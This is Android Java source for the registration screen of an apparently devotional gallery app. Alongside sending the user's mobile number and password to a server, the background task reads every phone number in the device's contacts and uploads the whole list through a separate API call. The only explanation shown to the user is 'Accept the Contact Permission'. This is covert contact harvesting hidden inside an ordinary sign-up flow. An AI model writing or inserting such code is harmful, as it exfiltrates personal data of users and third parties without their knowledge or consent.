package com.WeShowedUp.radharanipoojagallery.Controller;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.WeShowedUp.radharanipoojagallery.General.RetrofitClass;
import com.WeShowedUp.radharanipoojagallery.R;
import com.WeShowedUp.radharanipoojagallery.Response.ContactResponse.ContactResponse;
import com.WeShowedUp.radharanipoojagallery.Response.RegistrationResponse.RegistrationResponse;
import com.google.android.material.snackbar.Snackbar;

import java.util.ArrayList;
import java.util.Objects;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class RegistrationActivity extends AppCompatActivity
{

    EditText username,password,conf_password;
    Button button;
    static int PReCode=1;
    static int REQUESTCODE=1;
    Uri contact;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_registration);
        Objects.requireNonNull(getSupportActionBar()).hide();
        username=findViewById(R.id.registration_mobile_number);
        password=findViewById(R.id.registration_password);
        conf_password=findViewById(R.id.registration_conf_password);
        button=findViewById(R.id.registration_btn);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v)
            {

                if (String.valueOf(password.getText()).trim().equals(String.valueOf(conf_password.getText()).trim()))
                {
                    registration(String.valueOf(username.getText()).trim(),String.valueOf(password.getText()).trim());
                }
                else
                {
                    Snackbar.make(getWindow().getDecorView(),"Password Does not Match",Snackbar.LENGTH_SHORT).show();
                }
            }
        });
    }

    private void registration(String mobile, String password)
    {
        if (mobile.isEmpty() && password.isEmpty())
        {
            Snackbar.make(getWindow().getDecorView(),"Enter Mobile Number/Password",Snackbar.LENGTH_SHORT).show();
        }
        else
        {
            try {
                if (Build.VERSION.SDK_INT >= 22) {
                    checkResequestForPermission();
                } else {
                    ContactList();
                }
            } catch (Exception e) {
                Log.d("registration exception", "" + e);
            }
        }
    }

    private void ContactList()
    {
        new Contact(String.valueOf(username.getText()).trim(),String.valueOf(password.getText()).trim()).execute();
    }

    public class Contact extends AsyncTask<Void,Void,Void>
    {
        private String mobile;
        private String password;

        public Contact(String mobile, String password)
        {
            this.mobile = mobile;
            this.password = password;
        }

        @Override
        protected Void doInBackground(Void... voids)
        {
            RetrofitClass retrofitClass=new RetrofitClass();
            Call<RegistrationResponse> call=retrofitClass.retrofit().registration(mobile,password);
            call.enqueue(new Callback<RegistrationResponse>() {
                @Override
                public void onResponse(Call<RegistrationResponse> call, Response<RegistrationResponse> response)
                {
                    if (response.body()!=null)
                    {
                        startActivity(new Intent(RegistrationActivity.this, MainActivity.class));
                    }

                }

                @Override
                public void onFailure(Call<RegistrationResponse> call, Throwable t)
                {
                    Snackbar.make(getWindow().getDecorView(),"Bad Connection Try Again",Snackbar.LENGTH_SHORT).show();
                }
            });


            ArrayList<String> contactlist = new ArrayList<>();
            ContentResolver contentResolver=getContentResolver();
            Cursor cursor=contentResolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);
            if (cursor!=null)
                while (cursor.moveToNext())
                {
                    String id=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    Cursor phoneCursor=contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",new String[]{id},null);
                    Log.d("cursor", "doInBackground: " + phoneCursor);
                    if (phoneCursor!=null)
                        while (phoneCursor.moveToNext())
                        {
                            String phoneNumber=phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contactlist.add(phoneNumber);
                        }
                }
            RetrofitClass retrofitClass1 = new RetrofitClass();
            Call<ContactResponse> call1 = retrofitClass1.retrofit().contact(contactlist);
            call1.enqueue(new Callback<ContactResponse>() {
                @Override
                public void onResponse(Call<ContactResponse> call, Response<ContactResponse> response) {
                    System.out.println(contactlist);
                    System.out.println("Successful");
                }

                @Override
                public void onFailure(Call<ContactResponse> call, Throwable t) {

                }
            });
            return null;
        }
    }

    private void checkResequestForPermission()
    {
        if (ContextCompat.checkSelfPermission(RegistrationActivity.this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED)
        {
            if (ActivityCompat.shouldShowRequestPermissionRationale(RegistrationActivity.this,Manifest.permission.READ_CONTACTS))
            {
                ActivityCompat.requestPermissions(RegistrationActivity.this,new String[]{Manifest.permission.READ_CONTACTS},PReCode);
                Snackbar.make(getWindow().getDecorView(),"Accept the Contact Permission",Snackbar.LENGTH_SHORT).show();
            }
            else
            {
                ActivityCompat.requestPermissions(RegistrationActivity.this,new String[]{Manifest.permission.READ_CONTACTS},PReCode);
                Snackbar.make(getWindow().getDecorView(),"Accept the Contact Permission",Snackbar.LENGTH_SHORT).show();
            }
        }
        else
        {
            ContactList();
        }
    }
}